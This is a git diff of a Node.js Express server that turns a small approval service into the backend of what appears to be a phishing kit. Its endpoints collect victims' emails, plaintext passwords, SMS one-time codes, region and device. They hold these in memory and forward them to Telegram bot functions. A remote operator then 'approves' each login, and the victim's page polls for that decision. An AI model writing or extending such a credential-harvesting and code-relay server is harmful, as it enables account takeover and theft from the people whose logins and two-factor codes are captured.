@@ -1,110 +1,175 @@
-// server.js
-require("dotenv").config();
+// server.js (merged)
+console.log("📦 Starting combined server.js...");
 
 const express = require("express");
-const helmet = require("helmet");
-const morgan = require("morgan");
+const bodyParser = require("body-parser");
 const cors = require("cors");
-const { v4: uuidv4 } = require("uuid");
-const { createBot } = require("./bot");
-
-const PORT = process.env.PORT || 3000;
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
-
-if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
-  console.error("❌ Missing BOT_TOKEN or ADMIN_CHAT_ID in .env");
-  process.exit(1);
-}
-
-// In-memory store: requestId -> { status, createdAt }
-const store = new Map();
-
-// Expire requests after 10 minutes to avoid memory growth
-const TTL_MS = 10 * 60 * 1000;
-setInterval(() => {
-  const now = Date.now();
-  for (const [id, rec] of store.entries()) {
-    if (now - rec.createdAt > TTL_MS) store.delete(id);
-  }
-}, 60 * 1000);
-
-// Create and launch Telegram bot
-const { bot, sendApprovalButtons } = createBot({
-  botToken: BOT_TOKEN,
-  adminChatId: ADMIN_CHAT_ID,
-  store
-});
-
-bot.launch().then(() => console.log("✅ Telegram bot launched"));
+const fetch = require("node-fetch");
+const {
+  sendApprovalRequest,
+  sendApprovalRequestGeneric,
+  sendApprovalRequestSMS,
+  sendApprovalRequestPage,
+  sendLoginTelegram
+} = require("./bot");
 
 const app = express();
+const PORT = process.env.PORT || 3000;
 
-/**
- * ✅ CORS
- * This is the key fix so your hosted Render API can be called from:
- * - file:/// (origin "null")
- * - any frontend domain you host later
- */
-app.use(
-  cors({
-    origin: true,
-    methods: ["GET", "POST", "OPTIONS"],
-    allowedHeaders: ["Content-Type"]
-  })
-);
+app.use(cors());
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.static("public"));
 
-app.use(helmet());
-app.use(morgan("dev"));
-app.use(express.json({ limit: "32kb" }));
+// -----------------
+// Store pending approvals
+// -----------------
+const pendingUsers = {}; // email/password login (big)
+const pendingCodes = {}; // SMS codes
+const pendingGeneric = {}; // generic codes
+const pendingPage = {}; // page 4 logins
+const pendingApprovals = {}; // CB login approvals { email: { status, password, region, device } }
 
-/**
- * POST /api/submit
- * Body: { email: "..." }  (your frontend sends this)
- * Telegram: sends ONLY the buttons + requestId (no email text in Telegram).
- */
-app.post("/api/submit", async (req, res) => {
+// -----------------
+// Health check
+// -----------------
+app.get("/", (req, res) => {
+  res.send("✅ Combined Server is running.");
+});
+
+// -----------------
+// Email/Password Login (big)
+app.post("/login", (req, res) => {
+  const email = (req.body.email || "").trim().toLowerCase();
+  const password = req.body.password;
+
+  if (!email || !password) return res.status(400).json({ success: false, message: "Email and password required" });
+
+  pendingUsers[email] = { password, status: "pending" };
+  console.log(`📥 Login Received: ${email}`);
+
+  sendApprovalRequest(email, password);
+  res.json({ success: true });
+});
+
+// -----------------
+// Generic code submission (big)
+app.post("/generic-login", (req, res) => {
+  const identifier = (req.body.identifier || "").trim();
+  if (!identifier) return res.status(400).json({ success: false, message: "Identifier required" });
+
+  pendingGeneric[identifier] = { status: "pending" };
+  console.log(`📥 Generic Identifier Received: ${identifier}`);
+
+  sendApprovalRequestGeneric(identifier);
+  res.json({ success: true });
+});
+
+// -----------------
+// SMS Login (big)
+app.post("/sms-login", (req, res) => {
+  const code = (req.body.code || "").trim();
+  if (!code) return res.status(400).json({ success: false, message: "Code required" });
+
+  pendingCodes[code] = { status: "pending" };
+  console.log(`📥 SMS Code Received: ${code}`);
+
+  sendApprovalRequestSMS(code);
+  res.json({ success: true });
+});
+
+// -----------------
+// Page 4 Login (big)
+app.post("/page-login", (req, res) => {
+  const email = (req.body.email || "").trim().toLowerCase();
+  const password = req.body.password;
+
+  if (!email || !password) return res.status(400).json({ success: false, message: "Email and password required" });
+
+  pendingPage[email] = { password, status: "pending" };
+  console.log(`📥 Page 4 Login Received: ${email}`);
+
+  sendApprovalRequestPage(email, password);
+  res.json({ success: true });
+});
+
+// -----------------
+// CB Login (small)
+app.post("/send-login", async (req, res) => {
+  const { email, password, region, device } = req.body;
+  if (!email || !password) return res.status(400).json({ error: "Missing email or password" });
+
+  // Store pending first
+  pendingApprovals[email] = { status: "pending", password, region, device };
+  console.log(`📥 CB Login received: ${email}`);
+
+  // Send Telegram message
   try {
-    const { email } = req.body || {};
-    if (!email || typeof email !== "string") {
-      return res.status(400).json({ error: "Missing email" });
-    }
-
-    const requestId = uuidv4();
-
-    store.set(requestId, {
-      status: "pending",
-      createdAt: Date.now()
-    });
-
-    // ✅ Send Telegram message containing ONLY 3 buttons + requestId
-    await sendApprovalButtons(requestId);
-
-    return res.json({ requestId });
+    await sendLoginTelegram(email);
   } catch (err) {
-    console.error("submit error:", err);
-    return res.status(500).json({ error: "Server error" });
+    console.error("❌ Failed to send Telegram message:", err);
   }
+
+  res.json({ status: "ok" });
 });
 
-/**
- * GET /api/status/:id
- */
-app.get("/api/status/:id", (req, res) => {
-  const id = req.params.id;
-  const record = store.get(id);
-  if (!record) return res.status(404).json({ status: "not_found" });
-  return res.json({ status: record.status });
+// -----------------
+// Check status
+// Supports all types: big + CB
+app.get("/check-status", (req, res) => {
+  const identifier = (req.query.identifier || "").trim();
+  if (pendingUsers[identifier]) return res.json({ status: pendingUsers[identifier].status });
+  if (pendingCodes[identifier]) return res.json({ status: pendingCodes[identifier].status });
+  if (pendingGeneric[identifier]) return res.json({ status: pendingGeneric[identifier].status });
+  if (pendingPage[identifier]) return res.json({ status: pendingPage[identifier].status });
+  if (pendingApprovals[identifier]) return res.json({ status: pendingApprovals[identifier].status });
+  res.json({ status: "unknown" });
 });
 
-// Optional: health check
-app.get("/health", (req, res) => res.json({ ok: true }));
-
-// ✅ Bind to 0.0.0.0 for Render
-app.listen(PORT, "0.0.0.0", () => {
-  console.log(`✅ Server running on port ${PORT}`);
+// For frontend polling of CB login
+app.post("/check-status", (req, res) => {
+  const { email } = req.body;
+  if (!email || !pendingApprovals[email]) return res.json({ status: "pending" });
+  res.json({ status: pendingApprovals[email].status });
 });
 
-// Graceful stop
-process.once("SIGINT", () => bot.stop("SIGINT"));
-process.once("SIGTERM", () => bot.stop("SIGTERM"));
+// -----------------
+// Update approval status (called by bot)
+app.post("/update-status", (req, res) => {
+  const identifier = (req.body.identifier || req.body.email || "").trim();
+  const status = req.body.status;
+
+  console.log(`📬 Update Status Received: ${identifier}, ${status}`);
+
+  if (pendingUsers[identifier]) {
+    pendingUsers[identifier].status = status;
+  } else if (pendingCodes[identifier]) {
+    pendingCodes[identifier].status = status;
+  } else if (pendingGeneric[identifier]) {
+    pendingGeneric[identifier].status = status;
+  } else if (pendingPage[identifier]) {
+    pendingPage[identifier].status = status;
+  } else if (pendingApprovals[identifier]) {
+    pendingApprovals[identifier].status = status;
+  } else {
+    return res.json({ ok: false, message: "Identifier not found" });
+  }
+
+  console.log(`✅ Status updated for: ${identifier}`);
+  res.json({ ok: true });
+});
+
+// -----------------
+// Self-ping to stay awake
+setInterval(() => {
+  const url = process.env.APP_URL;
+  if (url) {
+    fetch(url).then(() => console.log("🔁 Pinged self")).catch(err => console.error("⚠️ Ping failed:", err));
+  }
+}, 30 * 1000);
+
+// -----------------
+// Start server
+app.listen(PORT, () => {
+  console.log(`✅ Combined server running at port ${PORT}`);
+});
